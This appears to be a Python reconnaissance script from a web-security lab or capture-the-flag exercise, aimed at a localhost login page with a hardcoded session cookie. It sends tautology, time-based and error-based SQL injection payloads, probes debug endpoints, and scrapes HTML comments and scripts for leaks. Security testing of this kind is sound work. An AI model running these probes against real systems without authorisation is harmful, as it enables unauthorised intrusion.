import requests
import re

BASE_URL = "http://127.0.0.1:32997"
SESSION_COOKIE = "eyJfZnJlc2giOmZhbHNlfQ.ac3llg.UJzGdw1D2kKSnyOhHRIJojg-VvQ"

def get_full_response(url, method='GET', data=None):
    """Get full response text"""
    session = requests.Session()
    session.cookies.set('session', SESSION_COOKIE)
    
    if method == 'POST':
        resp = session.post(url, data=data, timeout=10)
    else:
        resp = session.get(url, timeout=10)
    return resp

# Test login with different credentials and check full responses
print("=" * 80)
print("DETAILED LOGIN RESPONSE ANALYSIS")
print("=" * 80)

# Test 1: Valid format but wrong credentials
print("\n--- Test 1: Wrong credentials ---")
resp = get_full_response(f"{BASE_URL}/login", 'POST', {'username': 'admin', 'password': 'wrong'})
print(f"Status: {resp.status_code}")
print(f"Headers: {dict(resp.headers)}")
print(f"Response Body:\n{resp.text}")

# Extract just the main content/error message
if "alert" in resp.text.lower() or "error" in resp.text.lower():
    # Look for error messages
    errors = re.findall(r'<div[^>]*>([^<]*(?:error|invalid|wrong|failed)[^<]*)</div>', resp.text, re.IGNORECASE)
    if errors:
        print(f"Error messages found: {errors}")

print("\n" + "=" * 80)

# Test 2: SQL injection attempt
print("\n--- Test 2: SQL injection payload ---")
resp = get_full_response(f"{BASE_URL}/login", 'POST', {'username': "admin' OR '1'='1", 'password': 'test'})
print(f"Status: {resp.status_code}")
print(f"Response Body:\n{resp.text}")

print("\n" + "=" * 80)

# Test 3: Time-based SQL injection attempt
print("\n--- Test 3: Time-based payload ---")
import time
start = time.time()
resp = get_full_response(f"{BASE_URL}/login", 'POST', {'username': "admin' OR SLEEP(5) --", 'password': 'test'})
elapsed = time.time() - start
print(f"Status: {resp.status_code}")
print(f"Response time: {elapsed:.2f}s")

print("\n" + "=" * 80)

# Test 4: Error-based SQLi
print("\n--- Test 4: Error-based payload ---")
resp = get_full_response(f"{BASE_URL}/login", 'POST', {'username': "'", 'password': "'"})
print(f"Status: {resp.status_code}")
print(f"Response Body:\n{resp.text}")

# Extract any error messages
error_patterns = [
    r'<div[^>]*class="[^"]*(?:error|alert|danger)[^"]*"[^>]*>(.*?)</div>',
    r'<p[^>]*>([^<]*(?:error|invalid|wrong|failed)[^<]*)</p>',
    r'<span[^>]*>([^<]*(?:error|invalid|wrong|failed)[^<]*)</span>',
]

for pattern in error_patterns:
    matches = re.findall(pattern, resp.text, re.IGNORECASE | re.DOTALL)
    if matches:
        print(f"Potential error elements: {matches}")

print("\n" + "=" * 80)
print("CHECKING FOR NON-EXISTENT ENDPOINTS (may trigger 404 with info)")
print("=" * 80)

# Test non-existent endpoint for 404 page
session = requests.Session()
session.cookies.set('session', SESSION_COOKIE)

resp = session.get(f"{BASE_URL}/nonexistent_page_xyz", timeout=10)
print(f"\n--- Non-existent page test ---")
print(f"Status: {resp.status_code}")
print(f"Response Body:\n{resp.text}")

print("\n" + "=" * 80)
print("CHECKING APP.ERRORS OR DEBUG ENDPOINTS")
print("=" * 80)

debug_endpoints = ['/errors', '/debug', '/logs', '/console', '/trace']
for endpoint in debug_endpoints:
    resp = session.get(f"{BASE_URL}{endpoint}", timeout=5)
    print(f"\n{endpoint}: Status {resp.status_code}")
    if resp.status_code != 404:
        print(f"Response (first 500 chars): {resp.text[:500]}")

print("\n" + "=" * 80)
print("CHECKING SOURCE CODE FOR COMMENTS")
print("=" * 80)

# Get main page and check for HTML comments
resp = session.get(f"{BASE_URL}/login", timeout=10)
comments = re.findall(r'<!--(.*?)-->', resp.text, re.DOTALL)
if comments:
    print(f"HTML Comments found: {comments}")
else:
    print("No HTML comments found")

# Check for inline scripts with hardcoded data
scripts = re.findall(r'<script[^>]*>(.*?)</script>', resp.text, re.DOTALL)
if scripts:
    print(f"\nInline scripts found: {len(scripts)}")
    for i, script in enumerate(scripts[:3]):
        if len(script.strip()) > 50:
            print(f"Script {i+1}: {script[:200]}...")

# Check for meta tags
meta_tags = re.findall(r'<meta[^>]*>', resp.text, re.IGNORECASE)
if meta_tags:
    print(f"\nMeta tags: {meta_tags}")
